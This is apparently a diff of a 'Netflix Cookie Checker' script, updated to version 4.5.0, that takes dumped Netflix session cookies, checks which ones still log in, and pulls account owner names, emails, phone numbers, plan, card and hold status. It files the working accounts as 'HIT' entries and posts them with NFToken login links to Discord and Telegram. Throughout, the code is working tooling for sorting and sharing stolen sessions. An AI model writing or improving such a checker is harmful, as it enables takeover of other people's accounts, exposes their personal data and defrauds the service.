@@ -43,6 +43,7 @@ DEFAULT_CONFIG = {
         "user_guid": False,
     },
     "nftoken": False,
+    "add_emojis": "webhook",
     "notifications": {
         "webhook": {
             "enabled": False,
@@ -101,6 +102,7 @@ txt_fields:
   user_guid: false # user GUID extracted from account data
 
 nftoken: false # allowed: "pc", "mobile", "both" or false (case-insensitive, true => "both")
+add_emojis: "webhook" # allowed: false, "txt", "webhook", "both"; "webhook" = Discord/Telegram notification messages only (not TXT files); true => "both"
 
 notifications:
   webhook:
@@ -142,7 +144,7 @@ by https://github.com/harshitkamboj | website: harshitkamboj.in | discord: https
                         (Star The Repo 🌟 and Share for more Checkers)
 """
 
-APP_VERSION = "4.0.0"
+APP_VERSION = "4.5.0"
 
 cookies_folder = "cookies"
 output_folder = "output"
@@ -464,11 +466,17 @@ def get_canonical_output_label(plan_key):
     return canonical_labels.get(plan_key, "Unknown")
 
 
-def create_output_folder_when_needed(base_folder, plan_label, run_folder):
+def create_output_folder_when_needed(base_folder, plan_label, run_folder, category=None):
     safe_plan = decode_netflix_value(plan_label) or "Unknown"
     safe_plan = re.sub(r'[<>:"/\\|?*]+', "_", safe_plan).strip(" .")
     safe_plan = safe_plan or "Unknown"
-    output_path = os.path.join(base_folder, run_folder, safe_plan)
+    if category:
+        safe_category = decode_netflix_value(category) or "Other"
+        safe_category = re.sub(r'[<>:"/\\|?*]+', "_", safe_category).strip(" .")
+        safe_category = safe_category or "Other"
+        output_path = os.path.join(base_folder, run_folder, safe_plan, safe_category)
+    else:
+        output_path = os.path.join(base_folder, run_folder, safe_plan)
     os.makedirs(output_path, exist_ok=True)
     return output_path
 
@@ -565,6 +573,7 @@ def print_config_summary(config, config_source):
     # web tag: https[:]//harshitkamboj.in
     txt_fields = config.get("txt_fields", {})
     nftoken_mode = get_nftoken_mode(config)
+    add_emojis_mode = get_add_emojis_mode(config)
     webhook_cfg = config.get("notifications", {}).get("webhook", {})
     telegram_cfg = config.get("notifications", {}).get("telegram", {})
     display_cfg = config.get("display", {})
@@ -589,6 +598,7 @@ def print_config_summary(config, config_source):
     print(f"- Config file: {config_source}")
     print(f"- TXT fields enabled: {', '.join(enabled_txt) if enabled_txt else 'none'}")
     print(f"- NFToken links: {nftoken_mode}")
+    print(f"- Emojis: {add_emojis_mode}")
     print(f"- Webhook: {'ON' if webhook_cfg.get('enabled') else 'OFF'} (mode: {webhook_cfg.get('mode', 'full')})")
     print(f"- Telegram: {'ON' if telegram_cfg.get('enabled') else 'OFF'} (mode: {telegram_cfg.get('mode', 'full')})")
     print(f"- Display: mode={display_cfg.get('mode', 'log')}")
@@ -622,6 +632,7 @@ def render_simple_dashboard(counts, plan_counts, plan_labels, cookies_left, cook
     good_color = "\033[92m"
     free_color = "\033[95m"
     bad_color = "\033[91m"
+    hold_color = "\033[96m"
 
     clear_screen()
     processed = cookies_total - cookies_left
@@ -636,7 +647,7 @@ def render_simple_dashboard(counts, plan_counts, plan_labels, cookies_left, cook
     )
     print("")
     print(color_text("Plan Counts", section_color, colored))
-    default_plan_order = ["premium", "standard", "standard_with_ads", "basic", "mobile", "free", "unknown"]
+    default_plan_order = ["premium", "standard", "standard_with_ads", "basic", "mobile", "free"]
 
     # Keep extra-member accounts in separate folders internally, but show them as
     # a greyed sub-line under the base plan (similar to owner display in Spotify checker).
@@ -663,6 +674,8 @@ def render_simple_dashboard(counts, plan_counts, plan_labels, cookies_left, cook
         base_value = plan_counts.get(plan_key, 0)
         extra_value = extra_member_counts_by_base.get(plan_key, 0)
         total_value = base_value + extra_value
+        if plan_key == "unknown" and total_value <= 0:
+            continue
         plan_label = decode_netflix_value(plan_labels.get(plan_key)) or format_plan_label(plan_key)
         print(f"{color_text(plan_label + ':', label_color, colored)} {color_text(str(total_value), value_color, colored)}")
         if extra_value > 0:
@@ -675,6 +688,7 @@ def render_simple_dashboard(counts, plan_counts, plan_labels, cookies_left, cook
     print(f"{color_text('Free :', label_color, colored)} {color_text(str(counts['free']), free_color, colored)}")
     print(f"{color_text('Bad  :', label_color, colored)} {color_text(str(counts['bad']), bad_color, colored)}")
     print(f"{color_text('Dup  :', label_color, colored)} {color_text(str(counts['duplicate']), value_color, colored)}")
+    print(f"{color_text('OnHold:', label_color, colored)} {color_text(str(counts['on_hold']), hold_color, colored)}")
     print(f"{color_text('Err  :', label_color, colored)} {color_text(str(counts['errors']), bad_color, colored)}")
 
 
@@ -786,18 +800,36 @@ def load_proxies():
     return proxies
 
 
-REQUIRED_NETFLIX_COOKIES = ("NetflixId", "SecureNetflixId", "nfvdid")
-OPTIONAL_NETFLIX_COOKIES = ("OptanonConsent",)
-ALL_NETFLIX_COOKIE_NAMES = set(REQUIRED_NETFLIX_COOKIES + OPTIONAL_NETFLIX_COOKIES)
+LOGIN_REQUIRED_NETFLIX_COOKIES = ("NetflixId",)
+OPTIONAL_NETFLIX_COOKIES = ("SecureNetflixId", "nfvdid", "OptanonConsent")
+ALL_NETFLIX_COOKIE_NAMES = set(LOGIN_REQUIRED_NETFLIX_COOKIES + OPTIONAL_NETFLIX_COOKIES)
+CANONICAL_NETFLIX_COOKIE_NAMES = {name.lower(): name for name in ALL_NETFLIX_COOKIE_NAMES}
 
 
 def is_netflix_domain(domain):
-    normalized = str(domain or "").strip().lower()
+    normalized = str(domain or "").strip()
+    if normalized.startswith("#HttpOnly_"):
+        normalized = normalized[len("#HttpOnly_"):]
+    normalized = normalized.lower()
     return "netflix." in normalized
 
 
+def canonicalize_netflix_cookie_name(name):
+    normalized = str(name or "").strip()
+    return CANONICAL_NETFLIX_COOKIE_NAMES.get(normalized.lower(), normalized)
+
+
+def has_required_netflix_cookies(cookie_dict):
+    if not isinstance(cookie_dict, dict):
+        return False
+    for cookie_name in LOGIN_REQUIRED_NETFLIX_COOKIES:
+        if not decode_netflix_value(cookie_dict.get(cookie_name)):
+            return False
+    return True
+
+
 def is_netflix_cookie_entry(domain, name):
-    normalized_name = str(name or "").strip()
+    normalized_name = canonicalize_netflix_cookie_name(name)
     return normalized_name in ALL_NETFLIX_COOKIE_NAMES or is_netflix_domain(domain)
 
 
@@ -817,7 +849,7 @@ def convert_json_to_netscape(json_data):
         if not isinstance(cookie, dict):
             continue # https[:]//harshit kamboj.in
         domain = cookie.get("domain", "")
-        name = cookie.get("name", "")
+        name = canonicalize_netflix_cookie_name(cookie.get("name", ""))
         if not is_netflix_cookie_entry(domain, name):
             continue
         tail_match = "TRUE" if domain.startswith(".") else "FALSE"
@@ -833,7 +865,13 @@ def convert_json_to_netscape(json_data):
 
 def split_netscape_cookie_columns(line):
     stripped = line.strip()
-    if not stripped or stripped.startswith("#"):
+    if not stripped:
+        return []
+    if stripped.startswith("#") and not stripped.startswith("#HttpOnly_"):
+        return []
+    if stripped.startswith("#HttpOnly_"):
+        stripped = stripped[len("#HttpOnly_"):]
+    if not stripped:
         return []
 
     parts = stripped.split("\t")
@@ -854,19 +892,25 @@ def is_netscape_cookie_line(line):
         return False
     if parts[3].upper() not in ("TRUE", "FALSE"):
         return False
-    if not re.match(r"^-?\d+$", parts[4].strip()):
+    if not re.match(r"^-?\d+(?:\.\d+)?$", parts[4].strip()):
         return False
     return True
 
 
 def build_netscape_cookie_entry(domain, tail_match, path, secure, expires, name, value, position):
+    normalized_expires = str(expires or 0).strip()
+    if re.fullmatch(r"-?\d+\.\d+", normalized_expires):
+        try:
+            normalized_expires = str(int(float(normalized_expires)))
+        except Exception:
+            pass
     return {
-        "domain": str(domain or ""),
+        "domain": str(domain or "").replace("#HttpOnly_", "", 1),
         "tail_match": "TRUE" if str(tail_match).upper() == "TRUE" else "FALSE",
         "path": str(path or "/"),
         "secure": "TRUE" if str(secure).upper() == "TRUE" else "FALSE",
-        "expires": str(expires or 0),
-        "name": str(name or "").strip(),
+        "expires": normalized_expires or "0",
+        "name": canonicalize_netflix_cookie_name(name),
         "value": str(value or ""),
         "position": position,
     }
@@ -888,7 +932,7 @@ def extract_netscape_cookie_entries(raw_text):
         if len(parts) < 7:
             continue
         domain = parts[0]
-        name = parts[5]
+        name = canonicalize_netflix_cookie_name(parts[5])
         if not is_netflix_cookie_entry(domain, name):
             continue
         entries.append(
@@ -927,7 +971,7 @@ def extract_json_cookie_entries(content):
         if not isinstance(cookie, dict):
             continue
         domain = cookie.get("domain", "")
-        name = cookie.get("name", "")
+        name = canonicalize_netflix_cookie_name(cookie.get("name", ""))
         if not is_netflix_cookie_entry(domain, name):
             continue
         entries.append(
@@ -946,7 +990,6 @@ def extract_json_cookie_entries(content):
 
 
 def extract_raw_cookie_entries(raw_text):
-    canonical_cookie_names = {cookie_name.lower(): cookie_name for cookie_name in ALL_NETFLIX_COOKIE_NAMES}
     pattern = re.compile(
         rf"(?:['\"])?(?P<name>{'|'.join(sorted((re.escape(name) for name in ALL_NETFLIX_COOKIE_NAMES), key=len, reverse=True))})(?:['\"])?"
         r"\s*(?:=|:)\s*(?P<value>\"[^\"]*\"|'[^']*'|[^;\s]+)",
@@ -954,7 +997,7 @@ def extract_raw_cookie_entries(raw_text):
     )
     entries = []
     for index, match in enumerate(pattern.finditer(raw_text)):
-        cookie_name = canonical_cookie_names.get(match.group("name").lower(), match.group("name"))
+        cookie_name = canonicalize_netflix_cookie_name(match.group("name"))
         value = match.group("value")
         if len(value) >= 2 and value[0] == value[-1] and value[0] in {"'", '"'}:
             value = value[1:-1]
@@ -1026,7 +1069,7 @@ def cookies_dict_from_netscape(netscape_text):
         parts = split_netscape_cookie_columns(line)
         if len(parts) >= 7:
             domain = parts[0]
-            name = parts[5]
+            name = canonicalize_netflix_cookie_name(parts[5])
             value = parts[6]
             if is_netflix_cookie_entry(domain, name):
                 cookies[name] = value
@@ -1105,15 +1148,60 @@ def extract_first_match(response_text, patterns, flags=0):
     return None
 
 
+def parse_boolean_value(value):
+    if isinstance(value, bool):
+        return value
+    if isinstance(value, (int, float)) and not isinstance(value, bool):
+        if value == 1:
+            return True
+        if value == 0:
+            return False
+        return None
+    if isinstance(value, dict):
+        for key in (
+            "value",
+            "isUserOnHold",
+            "holdStatus",
+            "isOnHold",
+            "pastDue",
+            "isPastDue",
+            "isVerified",
+            "verified",
+        ):
+            if key in value:
+                parsed = parse_boolean_value(value.get(key))
+                if parsed is not None:
+                    return parsed
+        return None
+    cleaned = decode_netflix_value(value)
+    if cleaned is None:
+        return None
+    lowered = str(cleaned).strip().lower()
+    truthy = {"true", "yes", "1", "on"}
+    falsy = {"false", "no", "0", "off"}
+    if lowered in truthy:
+        return True
+    if lowered in falsy:
+        return False
+    return None
+
+
+def format_boolean_label(value):
+    parsed = parse_boolean_value(value)
+    if parsed is True:
+        return "Yes"
+    if parsed is False:
+        return "No"
+    return None
+
+
 def extract_bool_value(response_text, patterns):
     value = extract_first_match(response_text, patterns, re.IGNORECASE)
     if value is None:
         return None
-    lowered = value.lower()
-    if lowered == "true":
-        return "Yes"
-    if lowered == "false":
-        return "No"
+    parsed = format_boolean_label(value)
+    if parsed is not None:
+        return parsed
     return value
 
 
@@ -1226,6 +1314,13 @@ def extract_info_from_graphql_payload(response_text):
             if isinstance(feature, dict) and feature.get("type"):
                 feature_types.append(str(feature["type"]).upper())
 
+    def _first_boolean_label(*candidates):
+        for candidate in candidates:
+            labeled = format_boolean_label(candidate)
+            if labeled is not None:
+                return labeled
+        return None
+
     def _extract_price_value(plan_obj):
         if not isinstance(plan_obj, dict):
             return None
@@ -1249,6 +1344,18 @@ def extract_info_from_graphql_payload(response_text):
                     return decoded
         return None
 
+    hold_status = _first_boolean_label(
+        hold_meta.get("isUserOnHold") if isinstance(hold_meta, dict) else hold_meta,
+        hold_meta.get("holdStatus") if isinstance(hold_meta, dict) else None,
+        hold_meta.get("isOnHold") if isinstance(hold_meta, dict) else None,
+        hold_meta.get("pastDue") if isinstance(hold_meta, dict) else None,
+        growth_account.get("isUserOnHold"),
+        growth_account.get("holdStatus"),
+        growth_account.get("isOnHold"),
+        growth_account.get("pastDue"),
+        growth_account.get("isPastDue"),
+    )
+
     info = {
         "accountOwnerName": decode_netflix_value(current_profile.get("name")),
         "email": decode_netflix_value(email_value),
@@ -1264,18 +1371,9 @@ def extract_info_from_graphql_payload(response_text):
         "maskedCard": None,
         "phoneNumber": normalize_phone_number(phone_digits, phone_country_code),
         "videoQuality": decode_netflix_value(current_plan.get("videoQuality")),
-        "holdStatus": (
-            "Yes" if hold_meta.get("isUserOnHold") is True else
-            "No" if hold_meta.get("isUserOnHold") is False else None
-        ),
-        "emailVerified": (
-            "Yes" if email_verified is True else
-            "No" if email_verified is False else None
-        ),
-        "phoneVerified": (
-            "Yes" if phone_verified_graphql is True else
-            "No" if phone_verified_graphql is False else None
-        ),
+        "holdStatus": hold_status,
+        "emailVerified": format_boolean_label(email_verified),
+        "phoneVerified": format_boolean_label(phone_verified_graphql),
         "profiles": ", ".join(profile_names) if profile_names else None,
     }
 
@@ -1448,6 +1546,9 @@ def extract_info(response_text):
                 response_text,
                 [
                     r'"holdStatus"\s*:\s*(true|false)',
+                    r'"holdStatus"\s*:\s*\{\s*"fieldType"\s*:\s*"Boolean"\s*,\s*"value"\s*:\s*(true|false)',
+                    r'"isUserOnHold"\s*:\s*(true|false)',
+                    r'"isUserOnHold"\s*:\s*\{\s*"fieldType"\s*:\s*"Boolean"\s*,\s*"value"\s*:\s*(true|false)',
                     r'"isOnHold"\s*:\s*(true|false)',
                     r'"pastDue"\s*:\s*(true|false)',
                     r'"isPastDue"\s*:\s*(true|false)',
@@ -1493,8 +1594,12 @@ def extract_info(response_text):
         if extracted.get("paymentMethodType") in {None, "", "Yes"}:
             extracted["paymentMethodType"] = "CC"
 
-    if extracted["holdStatus"] is None and extracted.get("membershipStatus") == "CURRENT_MEMBER":
-        extracted["holdStatus"] = "No"
+    if extracted["holdStatus"] is None:
+        membership_status_key = normalize_plan_key(extracted.get("membershipStatus"))
+        if membership_status_key == "current_member":
+            extracted["holdStatus"] = "No"
+        elif any(token in membership_status_key for token in ("hold", "past_due", "payment_retry", "paused", "suspend")):
+            extracted["holdStatus"] = "Yes"
 
     if extracted["emailVerified"] is None and extracted.get("email"):
         extracted["emailVerified"] = "Yes"
@@ -1778,6 +1883,18 @@ def is_subscribed_account(info):
     return is_extra_member_account(info)
 
 
+def is_on_hold_account(info):
+    hold_value = format_boolean_label((info or {}).get("holdStatus"))
+    if hold_value is not None:
+        return hold_value == "Yes"
+
+    membership_status = normalize_plan_key((info or {}).get("membershipStatus"))
+    return any(
+        token in membership_status
+        for token in ("hold", "past_due", "payment_retry", "paused", "suspend")
+    )
+
+
 def derive_output_plan_bucket(info, is_subscribed):
     plan_key, plan_name = derive_plan_info(info, is_subscribed)
     folder_label = get_canonical_output_label(plan_key)
@@ -1876,6 +1993,33 @@ def get_nftoken_mode(config):
     if legacy_value is True:
         return "both"
     return "both"
+
+
+def get_add_emojis_mode(config):
+    raw_value = (config or {}).get("add_emojis", "webhook")
+    if isinstance(raw_value, bool):
+        return "both" if raw_value else "false"
+
+    raw_mode = str(raw_value).strip().lower()
+    if raw_mode in {"false", "off", "none", "disabled", "disable", "0", "no"}:
+        return "false"
+    if raw_mode in {"txt", "file", "output"}:
+        return "txt"
+    if raw_mode in {"webhook", "notify", "notification", "telegram", "tg"}:
+        return "webhook"
+    if raw_mode in {"both", "all", "true", "on", "1"}:
+        return "both"
+    return "webhook"
+
+
+def should_add_emojis(config, target):
+    mode = get_add_emojis_mode(config)
+    normalized_target = str(target or "").strip().lower()
+    if normalized_target == "txt":
+        return mode in {"txt", "both"}
+    if normalized_target in {"webhook", "notifications", "notify", "telegram"}:
+        return mode in {"webhook", "both"}
+    return False
 
 
 def build_nftoken_links(token, mode):
@@ -2182,13 +2326,75 @@ def normalize_phone_number(value, country_code=None):
 
 
 def country_code_to_flag(country_code):
-    code = (decode_netflix_value(country_code) or "").strip().upper()
-    if len(code) != 2 or not code.isalpha():
+    raw = (decode_netflix_value(country_code) or "").strip()
+    if not raw:
         return ""
-    return "".join(chr(127397 + ord(char)) for char in code)
+
+    upper = raw.upper()
+    if len(upper) == 2 and upper.isalpha():
+        return "".join(chr(127397 + ord(char)) for char in upper)
+
+    alpha3_to_alpha2 = {
+        "PHL": "PH",
+        "IND": "IN",
+        "BHR": "BH",
+        "BRA": "BR",
+        "USA": "US",
+        "GBR": "GB",
+        "JPN": "JP",
+        "KOR": "KR",
+        "IDN": "ID",
+        "MYS": "MY",
+        "SGP": "SG",
+        "THA": "TH",
+        "VNM": "VN",
+        "ARE": "AE",
+        "SAU": "SA",
+        "QAT": "QA",
+        "KWT": "KW",
+        "OMN": "OM",
+        "CAN": "CA",
+        "AUS": "AU",
+    }
+    name_to_alpha2 = {
+        "PHILIPPINES": "PH",
+        "INDIA": "IN",
+        "BAHRAIN": "BH",
+        "BRAZIL": "BR",
+        "UNITED STATES": "US",
+        "UNITED KINGDOM": "GB",
+        "JAPAN": "JP",
+        "SOUTH KOREA": "KR",
+        "INDONESIA": "ID",
+        "MALAYSIA": "MY",
+        "SINGAPORE": "SG",
+        "THAILAND": "TH",
+        "VIETNAM": "VN",
+        "UNITED ARAB EMIRATES": "AE",
+        "SAUDI ARABIA": "SA",
+        "QATAR": "QA",
+        "KUWAIT": "KW",
+        "OMAN": "OM",
+        "CANADA": "CA",
+        "AUSTRALIA": "AU",
+    }
+
+    mapped = alpha3_to_alpha2.get(upper) or name_to_alpha2.get(upper)
+    if mapped and len(mapped) == 2 and mapped.isalpha():
+        return "".join(chr(127397 + ord(char)) for char in mapped)
+
+    return ""
 
 
-def build_account_detail_lines(config, info, is_subscribed, output_filename=None):
+def format_country_with_flag(country_value, unknown_fallback="UNKNOWN"):
+    normalized_country = normalize_output_value(country_value, unknown_fallback=unknown_fallback)
+    country_flag = country_code_to_flag(normalized_country)
+    if country_flag:
+        return f"{normalized_country} {country_flag}"
+    return normalized_country
+
+
+def build_account_detail_lines(config, info, is_subscribed, output_filename=None, use_emojis=False, include_country_flag=True):
     txt_fields = config.get("txt_fields", {})
     free_hidden_fields = {
         "member_since",
@@ -2199,15 +2405,20 @@ def build_account_detail_lines(config, info, is_subscribed, output_filename=None
         "quality",
         "max_streams",
         "plan_price",
-        "hold_status",
         "extra_members",
         "membership_status",
     }
     _, normalized_plan_label = derive_plan_info(info, is_subscribed)
+    country_value = info.get("countryOfSignup")
+    rendered_country = (
+        format_country_with_flag(country_value)
+        if include_country_flag else
+        normalize_output_value(country_value)
+    )
     values = {
         "name": normalize_output_value(info.get("accountOwnerName")),
         "email": normalize_output_value(info.get("email")),
-        "country": normalize_output_value(info.get("countryOfSignup")),
+        "country": rendered_country,
         "plan": normalize_output_value(normalized_plan_label),
         "member_since": format_member_since(info.get("memberSince")),
         "next_billing": format_display_date(info.get("nextBillingDate")),
@@ -2253,23 +2464,36 @@ def build_account_detail_lines(config, info, is_subscribed, output_filename=None
             payment_value = values.get("payment_method", "")
             if str(payment_value).strip().upper() != "CC":
                 continue
-        if key in {"hold_status", "extra_members"} and values.get(key) != "Yes":
+        if key == "extra_members" and values.get(key) != "Yes":
+            continue
+        if key == "hold_status" and values.get(key) not in {"Yes", "No"}:
             continue
         if txt_fields.get(key, True):
             rendered_label = label
             if key == "profiles" and info.get("profileCount"):
                 rendered_label = f"Profiles ({info['profileCount']})"
+            if use_emojis:
+                rendered_label = decorate_notification_label(rendered_label, enabled=True)
             lines.append(f"{rendered_label}: {values[key]}")
     return lines
 
 
 def format_cookie_file(info, cookie_content, config, is_subscribed, nftoken_data=None):
     nftoken_mode = get_nftoken_mode(config)
+    txt_emojis_enabled = should_add_emojis(config, "txt")
     divider = "-" * 98
     usable_nftoken = has_usable_nftoken(nftoken_data)
 
     lines = [f"NETFLIX {'HIT' if is_subscribed else 'FREE'} :👇", ""]
-    lines.extend(build_account_detail_lines(config, info, is_subscribed))
+    lines.extend(
+        build_account_detail_lines(
+            config,
+            info,
+            is_subscribed,
+            use_emojis=txt_emojis_enabled,
+            include_country_flag=False,
+        )
+    )
     if is_subscribed and nftoken_mode != "false" and usable_nftoken:
         nftoken_links = build_nftoken_links((nftoken_data or {}).get("token"), nftoken_mode)
         lines.append("")
@@ -2279,9 +2503,11 @@ def format_cookie_file(info, cookie_content, config, is_subscribed, nftoken_data
         lines.append("")
         lines.append(f"NFToken: {nftoken_data['token']}")
         for label, link in nftoken_links:
-            lines.append(f"{label}: {link}")
+            rendered_label = render_nftoken_link_label(label, txt_emojis_enabled)
+            lines.append(f"{rendered_label}: {link}")
         if isinstance(nftoken_data, dict) and nftoken_data.get("expires_at_utc"):
-            lines.append(f"Valid Till (UTC): {nftoken_data['expires_at_utc']}")
+            valid_till_label = decorate_notification_label("Valid Till (UTC)", enabled=txt_emojis_enabled)
+            lines.append(f"{valid_till_label}: {nftoken_data['expires_at_utc']}")
 
     lines.append("")
     lines.append(divider)
@@ -2305,7 +2531,7 @@ def build_notification_details(config, info, is_subscribed, output_filename):
         lines = [
             f"Name: {normalize_output_value(info.get('accountOwnerName'))}",
             f"Email: {normalize_output_value(info.get('email'))}",
-            f"Country: {normalize_output_value(info.get('countryOfSignup'))}",
+            f"Country: {format_country_with_flag(info.get('countryOfSignup'))}",
             f"Plan: {normalize_output_value(normalized_plan_label)}",
             f"Email Verified: {normalize_output_value(info.get('emailVerified'))}",
             f"{profile_label}: {profiles_value}",
@@ -2313,13 +2539,6 @@ def build_notification_details(config, info, is_subscribed, output_filename):
         ]
     else:
         lines = build_account_detail_lines(config, info, is_subscribed)
-    country_value = decode_netflix_value(info.get("countryOfSignup"))
-    country_flag = country_code_to_flag(country_value)
-    if country_value and country_flag:
-        for index, line in enumerate(lines):
-            if line.startswith("Country: "):
-                lines[index] = f"Country: {country_value} {country_flag}"
-                break
     return [f"Status: {status}"] + lines
 
 
@@ -2357,7 +2576,9 @@ NOTIFICATION_LABEL_EMOJIS = {
 }
 
 
-def decorate_notification_label(label):
+def decorate_notification_label(label, enabled=True):
+    if not enabled:
+        return str(label or "")
     normalized = decode_netflix_value(label) or str(label or "").strip()
     if normalized.startswith("Profiles ("):
         normalized = "Profiles"
@@ -2367,12 +2588,17 @@ def decorate_notification_label(label):
     return label
 
 
-def build_discord_full_message(config, info, is_subscribed, output_filename, nftoken_data=None):
+def render_nftoken_link_label(label, use_emojis):
+    rendered = decode_netflix_value(label) or str(label or "")
+    return rendered
+
+
+def build_discord_full_message(config, info, is_subscribed, output_filename, nftoken_data=None, use_emojis=True):
     # social hint: discord[dot]gg/DYJFE9nu5X
     lines = ["# [Netflix Cookie](https://github.com/harshitkamboj/Netflix-Cookie-Checker)", "", "Cookie details"]
     for line in build_notification_details(config, info, is_subscribed, output_filename):
         label, value = line.split(": ", 1)
-        lines.append(f"**{decorate_notification_label(label)}:** {value}")
+        lines.append(f"**{decorate_notification_label(label, enabled=use_emojis)}:** {value}")
     nftoken_mode = get_nftoken_mode(config)
     links = []
     if is_subscribed and has_usable_nftoken(nftoken_data):
@@ -2380,10 +2606,11 @@ def build_discord_full_message(config, info, is_subscribed, output_filename, nft
     if links:
         lines.append("")
         for label, link in links:
-            lines.append(f"**{label}:** [Click here]({link})")
+            rendered_label = render_nftoken_link_label(label, use_emojis)
+            lines.append(f"**{rendered_label}:** [Click here]({link})")
         expiry_unix = get_nftoken_expiry_unix((nftoken_data or {}).get("expires_at_utc"))
         if expiry_unix is not None:
-            lines.append(f"**{decorate_notification_label('Valid Till')}:** <t:{expiry_unix}:R>")
+            lines.append(f"**{decorate_notification_label('Valid Till', enabled=use_emojis)}:** <t:{expiry_unix}:R>")
     lines.extend(
         [
             "",
@@ -2426,7 +2653,7 @@ def build_discord_cookie_message(cookie_content):
     return "\n".join(lines)
 
 
-def build_discord_nftoken_message(info, nftoken_data, nftoken_mode):
+def build_discord_nftoken_message(info, nftoken_data, nftoken_mode, use_emojis=True):
     _, normalized_plan_label = derive_plan_info(info or {}, True)
     country_value = decode_netflix_value((info or {}).get("countryOfSignup")) or "UNKNOWN"
     country_flag = country_code_to_flag(country_value)
@@ -2435,17 +2662,18 @@ def build_discord_nftoken_message(info, nftoken_data, nftoken_mode):
     lines = ["# [Netflix NFToken](https://github.com/harshitkamboj/Netflix-Cookie-Checker)", ""]
     links = build_nftoken_links((nftoken_data or {}).get("token"), nftoken_mode) if has_usable_nftoken(nftoken_data) else []
     if links:
-        lines.append(f"**{decorate_notification_label('Plan')}:** {normalized_plan_label}")
-        lines.append(f"**{decorate_notification_label('Country')}:** {country_display}")
+        lines.append(f"**{decorate_notification_label('Plan', enabled=use_emojis)}:** {normalized_plan_label}")
+        lines.append(f"**{decorate_notification_label('Country', enabled=use_emojis)}:** {country_display}")
         lines.append("")
         for label, link in links:
-            lines.append(f"**{label}:** [Click here]({link})")
+            rendered_label = render_nftoken_link_label(label, use_emojis)
+            lines.append(f"**{rendered_label}:** [Click here]({link})")
         if isinstance(nftoken_data, dict) and nftoken_data.get("expires_at_utc"):
             expiry_unix = get_nftoken_expiry_unix(nftoken_data.get("expires_at_utc"))
             if expiry_unix is not None:
-                lines.append(f"**{decorate_notification_label('Valid Till')}:** <t:{expiry_unix}:R>")
+                lines.append(f"**{decorate_notification_label('Valid Till', enabled=use_emojis)}:** <t:{expiry_unix}:R>")
             else:
-                lines.append(f"**{decorate_notification_label('Valid Till')}:** {nftoken_data['expires_at_utc']}")
+                lines.append(f"**{decorate_notification_label('Valid Till', enabled=use_emojis)}:** {nftoken_data['expires_at_utc']}")
     else:
         lines.append("NFToken unavailable")
     lines.extend(
@@ -2457,12 +2685,12 @@ def build_discord_nftoken_message(info, nftoken_data, nftoken_mode):
     return "\n".join(lines)
 
 
-def build_telegram_full_message(config, info, is_subscribed, output_filename, nftoken_data=None):
+def build_telegram_full_message(config, info, is_subscribed, output_filename, nftoken_data=None, use_emojis=True):
     # contact mark: @illuminatis69
     lines = ['<b><a href="https://github.com/harshitkamboj/Netflix-Cookie-Checker">Netflix Cookie</a></b>', "", "<b>Cookie details</b>"]
     for line in build_notification_details(config, info, is_subscribed, output_filename):
         label, value = line.split(": ", 1)
-        rendered_label = decorate_notification_label(label)
+        rendered_label = decorate_notification_label(label, enabled=use_emojis)
         lines.append(f"<b>{_escape_html(rendered_label)}:</b> {_escape_html(value)}")
     nftoken_mode = get_nftoken_mode(config)
     links = []
@@ -2471,10 +2699,11 @@ def build_telegram_full_message(config, info, is_subscribed, output_filename, nf
     if links:
         lines.append("")
         for label, link in links:
-            lines.append(f'<b>{_escape_html(label)}:</b> <a href="{_escape_html(link)}">Click here</a>')
+            rendered_label = render_nftoken_link_label(label, use_emojis)
+            lines.append(f'<b>{_escape_html(rendered_label)}:</b> <a href="{_escape_html(link)}">Click here</a>')
         if isinstance(nftoken_data, dict) and nftoken_data.get("expires_at_utc"):
             lines.append(
-                f"<b>{_escape_html(decorate_notification_label('Valid Till (UTC)'))}:</b> "
+                f"<b>{_escape_html(decorate_notification_label('Valid Till (UTC)', enabled=use_emojis))}:</b> "
                 f"{_escape_html(nftoken_data['expires_at_utc'])}"
             )
     lines.extend(
@@ -2502,7 +2731,7 @@ def build_telegram_cookie_message(cookie_content):
     return "\n".join(lines)
 
 
-def build_telegram_nftoken_message(info, nftoken_data, nftoken_mode):
+def build_telegram_nftoken_message(info, nftoken_data, nftoken_mode, use_emojis=True):
     _, normalized_plan_label = derive_plan_info(info or {}, True)
     country_value = decode_netflix_value((info or {}).get("countryOfSignup")) or "UNKNOWN"
     country_flag = country_code_to_flag(country_value)
@@ -2511,14 +2740,15 @@ def build_telegram_nftoken_message(info, nftoken_data, nftoken_mode):
     lines = ['<b><a href="https://github.com/harshitkamboj/Netflix-Cookie-Checker">Netflix NFToken</a></b>', ""]
     links = build_nftoken_links((nftoken_data or {}).get("token"), nftoken_mode) if has_usable_nftoken(nftoken_data) else []
     if links:
-        lines.append(f"<b>{_escape_html(decorate_notification_label('Plan'))}:</b> {_escape_html(normalized_plan_label)}")
-        lines.append(f"<b>{_escape_html(decorate_notification_label('Country'))}:</b> {_escape_html(country_display)}")
+        lines.append(f"<b>{_escape_html(decorate_notification_label('Plan', enabled=use_emojis))}:</b> {_escape_html(normalized_plan_label)}")
+        lines.append(f"<b>{_escape_html(decorate_notification_label('Country', enabled=use_emojis))}:</b> {_escape_html(country_display)}")
         lines.append("")
         for label, link in links:
-            lines.append(f'<b>{_escape_html(label)}:</b> <a href="{_escape_html(link)}">Click here</a>')
+            rendered_label = render_nftoken_link_label(label, use_emojis)
+            lines.append(f'<b>{_escape_html(rendered_label)}:</b> <a href="{_escape_html(link)}">Click here</a>')
         if isinstance(nftoken_data, dict) and nftoken_data.get("expires_at_utc"):
             lines.append(
-                f"<b>{_escape_html(decorate_notification_label('Valid Till'))}:</b> "
+                f"<b>{_escape_html(decorate_notification_label('Valid Till', enabled=use_emojis))}:</b> "
                 f"{_escape_html(nftoken_data['expires_at_utc'])}"
             )
     else:
@@ -2583,6 +2813,7 @@ def send_notifications(config, info, is_subscribed, output_filename, formatted_c
     webhook_mode = str(webhook_cfg.get("mode", "full")).lower()
     telegram_mode = str(telegram_cfg.get("mode", "full")).lower()
     nftoken_mode = get_nftoken_mode(config)
+    notification_emojis_enabled = should_add_emojis(config, "webhook")
     plan_key, _ = derive_plan_info(info or {}, is_subscribed)
     usable_nftoken = has_usable_nftoken(nftoken_data)
 
@@ -2591,7 +2822,14 @@ def send_notifications(config, info, is_subscribed, output_filename, formatted_c
             if is_plan_allowed_for_notifications(webhook_cfg, plan_key):
                 send_discord_webhook(
                     webhook_cfg.get("url", ""),
-                    build_discord_full_message(config, info, is_subscribed, output_filename, None),
+                    build_discord_full_message(
+                        config,
+                        info,
+                        is_subscribed,
+                        output_filename,
+                        None,
+                        use_emojis=notification_emojis_enabled,
+                    ),
                     output_filename,
